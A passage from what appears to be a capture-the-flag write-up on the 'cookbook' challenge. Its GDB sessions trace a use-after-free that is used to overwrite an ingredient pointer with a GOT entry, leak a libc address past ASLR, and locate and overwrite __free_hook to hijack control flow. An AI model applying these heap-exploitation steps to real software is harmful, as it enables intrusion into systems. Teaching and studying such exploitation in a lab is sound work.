0x804f2d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f300:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f330:  0x00000000  0x00000000  0x00000000  0x33393531
0x804f340:  0x38323735  0x0000000a  0x00000000  0x00000000
gef➤  x/w 0x804f6c0
0x804f6c0:  0x0804e050
gef➤  x/3w 0x0804e050
0x804e050:  0x00000000  0x00000006  0x65746177
gef➤  x/w 0x0804f6d0
0x804f6d0:  0x00000001
```

So we can see here is the memory for the recipe we created. We can see our ingredients, the ingredient counts, and the instructions for the recipe. Let's free this region of memory, then see what it looks like after it has been freed:

```
gef➤  c
Continuing.
d
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
^C
Program received signal SIGINT, Interrupt.
0xf7fd7fe9 in __kernel_vsyscall ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0xf7fb65e7  →  0xfb787c0a
$edx   : 0x1       
$esp   : 0xffffcda8  →  0xffffcdf8  →  0x00000009
$ebp   : 0xffffcdf8  →  0x00000009
$esi   : 0xf7fb65a0  →  0xfbad208b
$edi   : 0xf7fb6d60  →  0xfbad2887
$eip   : 0xf7fd7fe9  →  <__kernel_vsyscall+9> pop ebp
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcda8│+0x0000: 0xffffcdf8  →  0x00000009  ← $esp
0xffffcdac│+0x0004: 0x00000001
0xffffcdb0│+0x0008: 0xf7fb65e7  →  0xfb787c0a
0xffffcdb4│+0x000c: 0xf7ed9b23  →  <read+35> pop ebx
0xffffcdb8│+0x0010: 0xf7fb6000  →  0x001b1db0
0xffffcdbc│+0x0014: 0xf7e6e267  →  <_IO_file_underflow+295> add esp, 0x10
0xffffcdc0│+0x0018: 0x00000000
0xffffcdc4│+0x001c: 0xf7fb65e7  →  0xfb787c0a
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd7fe3 <__kernel_vsyscall+3> mov    ebp, ecx
   0xf7fd7fe5 <__kernel_vsyscall+5> syscall
   0xf7fd7fe7 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd7fe9 <__kernel_vsyscall+9> pop    ebp
   0xf7fd7fea <__kernel_vsyscall+10> pop    edx
   0xf7fd7feb <__kernel_vsyscall+11> pop    ecx
   0xf7fd7fec <__kernel_vsyscall+12> ret    
   0xf7fd7fed                  nop    
   0xf7fd7fee                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd7fe9 → __kernel_vsyscall()
[#1] 0xf7ed9b23 → read()
[#2] 0xf7e6e267 → _IO_file_underflow()
[#3] 0xf7e6f237 → _IO_default_uflow()
[#4] 0xf7e6f02c → __uflow()
[#5] 0xf7e63291 → _IO_getline_info()
[#6] 0xf7e633ce → _IO_getline()
[#7] 0xf7e621ed → fgets()
[#8] 0x8048a20 → add esp, 0x10
[#9] 0x804a426 → call 0x8049bed
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/40w 0x804f2b0
0x804f2b0:  0xf7fb67b0  0xf7fb67b0  0x00000000  0x00000000
0x804f2c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f300:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f330:  0x00000000  0x00000000  0x00000000  0x33393531
0x804f340:  0x38323735  0x0000000a  0x00000000  0x00000000
gef➤  x/w 0xf7fb67b0
0xf7fb67b0: 0x0804f6d8
```

So we can see that the pointers to ingredient counts and ingredient pointers have been written over with heap metadata (pointing to the next area of the heap which can be allocated). We can see that the recipe instructions remain there. Let's add an ingredient now and see how this memory region looks:

```
gef➤  c
Continuing.
a
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
n
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
g
0000
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
p
1
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
s
2
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
^C
Program received signal SIGINT, Interrupt.
0xf7fd7fe9 in __kernel_vsyscall ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0xf7fb65e7  →  0xfb787c0a
$edx   : 0x1       
$esp   : 0xffffcd68  →  0xffffcdb8  →  0x00000009
$ebp   : 0xffffcdb8  →  0x00000009
$esi   : 0xf7fb65a0  →  0xfbad208b
$edi   : 0xf7fb6d60  →  0xfbad2887
$eip   : 0xf7fd7fe9  →  <__kernel_vsyscall+9> pop ebp
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcd68│+0x0000: 0xffffcdb8  →  0x00000009  ← $esp
0xffffcd6c│+0x0004: 0x00000001
0xffffcd70│+0x0008: 0xf7fb65e7  →  0xfb787c0a
0xffffcd74│+0x000c: 0xf7ed9b23  →  <read+35> pop ebx
0xffffcd78│+0x0010: 0xf7fb6000  →  0x001b1db0
0xffffcd7c│+0x0014: 0xf7e6e267  →  <_IO_file_underflow+295> add esp, 0x10
0xffffcd80│+0x0018: 0x00000000
0xffffcd84│+0x001c: 0xf7fb65e7  →  0xfb787c0a
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd7fe3 <__kernel_vsyscall+3> mov    ebp, ecx
   0xf7fd7fe5 <__kernel_vsyscall+5> syscall
   0xf7fd7fe7 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd7fe9 <__kernel_vsyscall+9> pop    ebp
   0xf7fd7fea <__kernel_vsyscall+10> pop    edx
   0xf7fd7feb <__kernel_vsyscall+11> pop    ecx
   0xf7fd7fec <__kernel_vsyscall+12> ret    
   0xf7fd7fed                  nop    
   0xf7fd7fee                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd7fe9 → __kernel_vsyscall()
[#1] 0xf7ed9b23 → read()
[#2] 0xf7e6e267 → _IO_file_underflow()
[#3] 0xf7e6f237 → _IO_default_uflow()
[#4] 0xf7e6f02c → __uflow()
[#5] 0xf7e63291 → _IO_getline_info()
[#6] 0xf7e633ce → _IO_getline()
[#7] 0xf7e621ed → fgets()
[#8] 0x8048d45 → add esp, 0x10
[#9] 0x8048a5d → jmp 0x8048b42
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/wx 0x804d09c
0x804d09c:  0x0804f2b0
gef➤  x/40w 0x0804f2b0
0x804f2b0:  0x00000002  0x00000001  0x30303030  0x00000000
0x804f2c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f300:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f330:  0x00000000  0x00000000  0x00000000  0x0804f2b0
0x804f340:  0x38323735  0x00000379  0xf7fb67b0  0xf7fb67b0
gef➤  x/w 0x804d0a0
0x804d0a0:  0x0804f2b0
```

So we can see that the instructions we had at `0x804f33c` for the recipe have been overwritten with a pointer to the ingredient (which we can see the calories, price, and name starting at `0x804f2b0`). Because of its position being in the exact spot that the instructions were at, we should be able to make a new recipe and overwrite that pointer since `currentRecipe` is still pointing to `0x804f2b0`.

```
gef➤  c
Continuing.
e
saved!
====================
[l]ist current stats?
[n]ew ingredient?
[c]ontinue editing ingredient?
[d]iscard current ingredient?
[g]ive name to ingredient?
[p]rice ingredient?
[s]et calories?
[q]uit (doesn't save)?
[e]xport saving changes (doesn't quit)?
q
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
c
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
i
7895
[n]ew recipe
[d]iscard recipe
[a]dd ingredient
[r]emove ingredient
[g]ive recipe a name
[i]nclude instructions
[s]ave recipe
[p]rint current recipe
[q]uit
^C
Program received signal SIGINT, Interrupt.
0xf7fd7fe9 in __kernel_vsyscall ()
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfffffe00
$ebx   : 0x0       
$ecx   : 0xf7fb65e7  →  0xfb787c0a
$edx   : 0x1       
$esp   : 0xffffccc8  →  0xffffcd18  →  0x00000009
$ebp   : 0xffffcd18  →  0x00000009
$esi   : 0xf7fb65a0  →  0xfbad208b
$edi   : 0xf7fb6d60  →  0xfbad2887
$eip   : 0xf7fd7fe9  →  <__kernel_vsyscall+9> pop ebp
$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffccc8│+0x0000: 0xffffcd18  →  0x00000009  ← $esp
0xffffcccc│+0x0004: 0x00000001
0xffffccd0│+0x0008: 0xf7fb65e7  →  0xfb787c0a
0xffffccd4│+0x000c: 0xf7ed9b23  →  <read+35> pop ebx
0xffffccd8│+0x0010: 0xf7fb6000  →  0x001b1db0
0xffffccdc│+0x0014: 0xf7e6e267  →  <_IO_file_underflow+295> add esp, 0x10
0xffffcce0│+0x0018: 0x00000000
0xffffcce4│+0x001c: 0xf7fb65e7  →  0xfb787c0a
──────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7fd7fe3 <__kernel_vsyscall+3> mov    ebp, ecx
   0xf7fd7fe5 <__kernel_vsyscall+5> syscall
   0xf7fd7fe7 <__kernel_vsyscall+7> int    0x80
 → 0xf7fd7fe9 <__kernel_vsyscall+9> pop    ebp
   0xf7fd7fea <__kernel_vsyscall+10> pop    edx
   0xf7fd7feb <__kernel_vsyscall+11> pop    ecx
   0xf7fd7fec <__kernel_vsyscall+12> ret    
   0xf7fd7fed                  nop    
   0xf7fd7fee                  nop    
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: SIGINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7fd7fe9 → __kernel_vsyscall()
[#1] 0xf7ed9b23 → read()
[#2] 0xf7e6e267 → _IO_file_underflow()
[#3] 0xf7e6f237 → _IO_default_uflow()
[#4] 0xf7e6f02c → __uflow()
[#5] 0xf7e63291 → _IO_getline_info()
[#6] 0xf7e633ce → _IO_getline()
[#7] 0xf7e621ed → fgets()
[#8] 0x8049159 → add esp, 0x10
[#9] 0x8048a67 → jmp 0x8048b42
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/40w 0x0804f2b0
0x804f2b0:  0x00000002  0x00000001  0x30303030  0x00000000
0x804f2c0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2d0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2e0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f2f0:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f300:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f310:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f320:  0x00000000  0x00000000  0x00000000  0x00000000
0x804f330:  0x00000000  0x00000000  0x00000000  0x35393837
0x804f340:  0x3832000a  0x00000011  0x0804f2b0  0x00000000
```

So we can see that the pointer to our new ingredient is at `0x804f348`, and is within the range of the write we get for making instructions which starts at `0x804f33c`. So using this, we can overwrite the pointer for this new ingredient by writing `'0'*12 + x` where `x` is the value we are replacing the pointer with.


Now with this we can get another infoleak, this time to libc. Looking at the `printIngredientProperties()` function we can see that it is expecting a pointer to print out. We should be able to overwrite the ingredient pointer with a GOT table address for a libc function, which will store the actual libc address for that function. Because of this, when we trigger the option for listing the ingredients, it will print out that libc address, plus two other address 4 and 8 bytes down.

Let's find a got address for the function free:

```
$ $ readelf --relocs ./cookbook | grep free
0804d018  00000407 R_386_JUMP_SLOT   00000000   free@GLIBC_2.0
```

So if we overwrite the address of our new ingredient with `0x804d018` it should print out the address of free, and with that we can break ASLR in libc.

Now one thing to remember about doing this write, since we are dealing with a linked list, it will expect a pointer to the next item right after the current pointer (unless if there are no more, which is signified by 0x00000000). SInce our input is scanned in using `fgets()`, there will be a trailing newline character which will get written to the location that it will expect the next pointer, so we will need to add four null bytes, otherwise it will try to interpret 0xa as a pointer and crash.

Also the whole reason we are able to do this, is because `currentRecipe` is not reset to 0 after the pointer it contains is freed (so we have that UAF).

#### Finding Free Hook

So in order to write to the free hook, we need to first find it. If we have symbols, we can do something like this:

```
gef➤  set __free_hook = 0xfacade
gef➤  search-pattern 0xfacade
[+] Searching '\xde\xca\xfa' in memory
[+] In (0xf7fb4000-0xf7fb7000), permission=rw-
  0xf7fb48b0 - 0xf7fb48bc  →   "\xde\xca\xfa[...]"
gef➤  x/w 0xf7fb48b0
0xf7fb48b0 <__free_hook>: 0x00facade
```

However what if we don't have symbols? Before we do that, let's look at the assembly code for free:

```
=> 0xf7f1b625:  mov    ebx,DWORD PTR [esp]
   0xf7f1b628:  ret    
```

```
gef➤  x/20i free
   0xf75dedc0 <free>: push   ebx
   0xf75dedc1 <free+1>: call   0xf768f625
   0xf75dedc6 <free+6>: add    ebx,0x14323a
   0xf75dedcc <free+12>:  sub    esp,0x8
   0xf75dedcf <free+15>:  mov    eax,DWORD PTR [ebx-0x98]
   0xf75dedd5 <free+21>:  mov    ecx,DWORD PTR [esp+0x10]
   0xf75dedd9 <free+25>:  mov    eax,DWORD PTR [eax]
   0xf75deddb <free+27>:  test   eax,eax
   0xf75deddd <free+29>:  jne    0xf75dee50 <free+144>
```

So we can see here the value of `ebx` is just the stack pointer . Then it has the hex string `0x1432a` added to it, then has `0x98` subtracted from it before it is moved into `eax` to be used as the free hook. Then it checks to see if it actually points anything (checks to see if there is a hook) and if there is, it will jump to the part where it will execute the hook.

```
   0xf7e6ae50 <free+144>: sub    esp,0x8
   0xf7e6ae53 <free+147>: push   DWORD PTR [esp+0x14]
   0xf7e6ae57 <free+151>: push   ecx
   0xf7e6ae58 <free+152>: call   eax
```

Here we can see it calls `eax` which has the web hook from the previous block. Let's see where the free hook is in memory:

```
gef➤  b free
Breakpoint 1 at 0x8048530
gef➤  r
Starting program: /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
what's your name?
guyinatuxedo
+-----------------------------+
|          .--,--.            |
|          `.  ,.'            |
|           |___|             |
|           :o o:             |
|          _`~^~'             |
|        /'   ^   `\          |
| cooking manager pro v6.1... |
+-----------------------------+
====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
g
how long is the name of your cookbook? (hex because you're both a chef and a hacker!) : 0x50
15935728
the new name of the cookbook is 15935728

====================
[l]ist ingredients
[r]ecipe book
[a]dd ingredient
[c]reate recipe
[e]xterminate ingredient
[d]elete recipe
[g]ive your cookbook a name!
[R]emove cookbook name
[q]uit
R

[----------------------------------registers-----------------------------------]
EAX: 0x804f2b0 ("15935728\n")
EBX: 0xffffd190 --> 0x1
ECX: 0xffffd152 --> 0xa5000a52
EDX: 0xf7fb487c --> 0x0
ESI: 0x1
EDI: 0xf7fb3000 --> 0x1b5db0
EBP: 0xffffd0a8 --> 0xffffd168 --> 0xffffd178 --> 0x0
ESP: 0xffffd08c --> 0x8048b62 (add    esp,0x10)
EIP: 0xf7e6fdc0 (<free>:  push   ebx)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e6fdad:  jmp    0xf7e6fbb4
   0xf7e6fdb2:  lea    esi,[esi+eiz*1+0x0]
   0xf7e6fdb9:  lea    edi,[edi+eiz*1+0x0]
=> 0xf7e6fdc0 <free>: push   ebx
   0xf7e6fdc1 <free+1>: call   0xf7f20625
   0xf7e6fdc6 <free+6>: add    ebx,0x14323a
   0xf7e6fdcc <free+12>:  sub    esp,0x8
   0xf7e6fdcf <free+15>:  mov    eax,DWORD PTR [ebx-0x98]
[------------------------------------stack-------------------------------------]
0000| 0xffffd08c --> 0x8048b62 (add    esp,0x10)
0004| 0xffffd090 --> 0x804f2b0 ("15935728\n")
0008| 0xffffd094 --> 0xf7fb3000 --> 0x1b5db0
0012| 0xffffd098 --> 0xffffd168 --> 0xffffd178 --> 0x0
0016| 0xffffd09c --> 0x8048a20 (add    esp,0x10)
0020| 0xffffd0a0 --> 0xffffd152 --> 0xa5000a52
0024| 0xffffd0a4 --> 0xa ('\n')
0028| 0xffffd0a8 --> 0xffffd168 --> 0xffffd178 --> 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0804f2b0  →  "15935728"
$ebx   : 0xffffd190  →  0x00000001
$ecx   : 0xffffd152  →  0xa5000a52 ("R"?)
$edx   : 0xf7fb487c  →  0x00000000
$esp   : 0xffffd08c  →  0x08048b62  →   add esp, 0x10
$ebp   : 0xffffd0a8  →  0xffffd168  →  0xffffd178  →  0x00000000
$esi   : 0x1       
$edi   : 0xf7fb3000  →  0x001b5db0
$eip   : 0xf7e6fdc0  →  <free+0> push ebx
$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd08c│+0x0000: 0x08048b62  →   add esp, 0x10  ← $esp
0xffffd090│+0x0004: 0x0804f2b0  →  "15935728"
0xffffd094│+0x0008: 0xf7fb3000  →  0x001b5db0
0xffffd098│+0x000c: 0xffffd168  →  0xffffd178  →  0x00000000
0xffffd09c│+0x0010: 0x08048a20  →   add esp, 0x10
0xffffd0a0│+0x0014: 0xffffd152  →  0xa5000a52 ("R"?)
0xffffd0a4│+0x0018: 0x0000000a
0xffffd0a8│+0x001c: 0xffffd168  →  0xffffd178  →  0x00000000   ← $ebp
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7e6fdad                  jmp    0xf7e6fbb4
   0xf7e6fdb2                  lea    esi, [esi+eiz*1+0x0]
   0xf7e6fdb9                  lea    edi, [edi+eiz*1+0x0]
 → 0xf7e6fdc0 <free+0>         push   ebx
   0xf7e6fdc1 <free+1>         call   0xf7f20625
   0xf7e6fdc6 <free+6>         add    ebx, 0x14323a
   0xf7e6fdcc <free+12>        sub    esp, 0x8
   0xf7e6fdcf <free+15>        mov    eax, DWORD PTR [ebx-0x98]
   0xf7e6fdd5 <free+21>        mov    ecx, DWORD PTR [esp+0x10]
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7e6fdc0 → free()
[#1] 0x8048b62 → add esp, 0x10
[#2] 0x8048a7b → jmp 0x8048b42
[#3] 0x804a426 → call 0x8049bed
[#4] 0xf7e15276 → __libc_start_main()
[#5] 0x8048621 → hlt
────────────────────────────────────────────────────────────────────────────────

Breakpoint 1, 0xf7e6fdc0 in free () from /lib/i386-linux-gnu/libc.so.6
gef➤  s
```

step through the instructions untill you hit `free+25`:

```
[----------------------------------registers-----------------------------------]
EAX: 0xf7fb48b0 --> 0x0
EBX: 0xf7fb3000 --> 0x1b5db0
ECX: 0x804f2b0 ("15935728\n")
EDX: 0xf7fb487c --> 0x0
ESI: 0x1
EDI: 0xf7fb3000 --> 0x1b5db0
EBP: 0xffffd0a8 --> 0xffffd168 --> 0xffffd178 --> 0x0
ESP: 0xffffd080 --> 0x804f2b0 ("15935728\n")
EIP: 0xf7e6fdd9 (<free+25>: mov    eax,DWORD PTR [eax])
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0xf7e6fdcc <free+12>:  sub    esp,0x8
   0xf7e6fdcf <free+15>:  mov    eax,DWORD PTR [ebx-0x98]
   0xf7e6fdd5 <free+21>:  mov    ecx,DWORD PTR [esp+0x10]
=> 0xf7e6fdd9 <free+25>:  mov    eax,DWORD PTR [eax]
   0xf7e6fddb <free+27>:  test   eax,eax
   0xf7e6fddd <free+29>:  jne    0xf7e6fe50 <free+144>
   0xf7e6fddf <free+31>:  test   ecx,ecx
   0xf7e6fde1 <free+33>:  je     0xf7e6fe5d <free+157>
[------------------------------------stack-------------------------------------]
0000| 0xffffd080 --> 0x804f2b0 ("15935728\n")
0004| 0xffffd084 --> 0xf7e6fdc6 (<free+6>:  add    ebx,0x14323a)
0008| 0xffffd088 --> 0xffffd190 --> 0x1
0012| 0xffffd08c --> 0x8048b62 (add    esp,0x10)
0016| 0xffffd090 --> 0x804f2b0 ("15935728\n")
0020| 0xffffd094 --> 0xf7fb3000 --> 0x1b5db0
0024| 0xffffd098 --> 0xffffd168 --> 0xffffd178 --> 0x0
0028| 0xffffd09c --> 0x8048a20 (add    esp,0x10)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0xf7fb48b0  →  0x00000000
$ebx   : 0xf7fb3000  →  0x001b5db0
$ecx   : 0x0804f2b0  →  "15935728"
$edx   : 0xf7fb487c  →  0x00000000
$esp   : 0xffffd080  →  0x0804f2b0  →  "15935728"
$ebp   : 0xffffd0a8  →  0xffffd168  →  0xffffd178  →  0x00000000
$esi   : 0x1       
$edi   : 0xf7fb3000  →  0x001b5db0
$eip   : 0xf7e6fdd9  →  <free+25> mov eax, DWORD PTR [eax]
$eflags: [carry parity adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
───────────────────────────────────────────────────────────────────── stack ────
0xffffd080│+0x0000: 0x0804f2b0  →  "15935728"  ← $esp
0xffffd084│+0x0004: 0xf7e6fdc6  →  <free+6> add ebx, 0x14323a
0xffffd088│+0x0008: 0xffffd190  →  0x00000001
0xffffd08c│+0x000c: 0x08048b62  →   add esp, 0x10
0xffffd090│+0x0010: 0x0804f2b0  →  "15935728"
0xffffd094│+0x0014: 0xf7fb3000  →  0x001b5db0
0xffffd098│+0x0018: 0xffffd168  →  0xffffd178  →  0x00000000
0xffffd09c│+0x001c: 0x08048a20  →   add esp, 0x10
─────────────────────────────────────────────────────────────── code:x86:32 ────
   0xf7e6fdcc <free+12>        sub    esp, 0x8
   0xf7e6fdcf <free+15>        mov    eax, DWORD PTR [ebx-0x98]
   0xf7e6fdd5 <free+21>        mov    ecx, DWORD PTR [esp+0x10]
 → 0xf7e6fdd9 <free+25>        mov    eax, DWORD PTR [eax]
   0xf7e6fddb <free+27>        test   eax, eax
   0xf7e6fddd <free+29>        jne    0xf7e6fe50 <free+144>
   0xf7e6fddf <free+31>        test   ecx, ecx
   0xf7e6fde1 <free+33>        je     0xf7e6fe5d <free+157>
   0xf7e6fde3 <free+35>        lea    edx, [ecx-0x8]
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "cookbook", stopped, reason: SINGLE STEP
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0xf7e6fdd9 → free()
[#1] 0x8048b62 → add esp, 0x10
[#2] 0x8048a7b → jmp 0x8048b42
[#3] 0x804a426 → call 0x8049bed
[#4] 0xf7e15276 → __libc_start_main()
[#5] 0x8048621 → hlt
────────────────────────────────────────────────────────────────────────────────
0xf7e6fdd9 in free () from /lib/i386-linux-gnu/libc.so.6
gef➤  p $eax
$1 = 0xf7fb48b0
gef➤  x/w 0xf7fb48b0
0xf7fb48b0 <__free_hook>: 0x00000000
gef➤  vmmap
Start      End        Offset     Perm Path
0x08048000 0x0804c000 0x00000000 r-x /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
0x0804c000 0x0804d000 0x00003000 r-- /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
0x0804d000 0x0804e000 0x00004000 rw- /Hackery/pod/modules/house_of_force/bkp16_cookbook/cookbook
0x0804e000 0x0806f000 0x00000000 rw- [heap]
0xf7dfd000 0xf7fb1000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.24.so
0xf7fb1000 0xf7fb3000 0x001b3000 r-- /lib/i386-linux-gnu/libc-2.24.so
0xf7fb3000 0xf7fb4000 0x001b5000 rw- /lib/i386-linux-gnu/libc-2.24.so
0xf7fb4000 0xf7fb7000 0x00000000 rw-
0xf7fd2000 0xf7fd5000 0x00000000 rw-
0xf7fd5000 0xf7fd7000 0x00000000 r-- [vvar]
0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
0xf7fd9000 0xf7ffc000 0x00000000 r-x /lib/i386-linux-gnu/ld-2.24.so
0xf7ffc000 0xf7ffd000 0x00022000 r-- /lib/i386-linux-gnu/ld-2.24.so
0xf7ffd000 0xf7ffe000 0x00023000 rw- /lib/i386-linux-gnu/ld-2.24.so
0xfffdd000 0xffffe000 0x00000000 rw- [stack]
```

So we can see the hook at `0xf7fb48b0` which is stored in the libc between. Let's follow the process when we actually set the free hook (we will just be setting it to 0000):

```
gef➤  set *0xf7fb48b0 = 0x30303030
gef➤  x/w 0xf7fb48b0
0xf7fb48b0 <__free_hook>: 0x30303030
gef➤  s
```

After we step through the instructions up to the call:

```
[----------------------------------registers-----------------------------------]
EAX: 0x30303030 ('0000')
EBX: 0xf7fb3000 --> 0x1b5db0
ECX: 0x804f2b0 ("15935728\n")
EDX: 0xf7fb487c --> 0x0
ESI: 0x1
EDI: 0xf7fb3000 --> 0x1b5db0
EBP: 0xffffd0a8 --> 0xffffd168 --> 0xffffd178 --> 0x0
ESP: 0xffffd06c --> 0xf7e6fe5a (<free+154>: add    esp,0x10)
EIP: 0x30303030 ('0000')
EFLAGS: 0x296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x30303030
[------------------------------------stack-------------------------------------]
0000| 0xffffd06c --> 0xf7e6fe5a (<free+154>:  add    esp,0x10)
0004| 0xffffd070 --> 0x804f2b0 ("15935728\n")
0008| 0xffffd074 --> 0x8048b62 (add    esp,0x10)
0012| 0xffffd078 --> 0xf7fb487c --> 0x0
0016| 0xffffd07c --> 0xf7e6fdc0 (<free>:  push   ebx)
0020| 0xffffd080 --> 0x804f2b0 ("15935728\n")
0024| 0xffffd084 --> 0xf7e6fdc6 (<free+6>:  add    ebx,0x14323a)
0028| 0xffffd088 --> 0xffffd190 --> 0x1
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$eax   : 0x30303030 ("0000"?)
$ebx   : 0xf7fb3000  →  0x001b5db0
$ecx   : 0x0804f2b0  →  "15935728"
$edx   : 0xf7fb487c  →  0x00000000
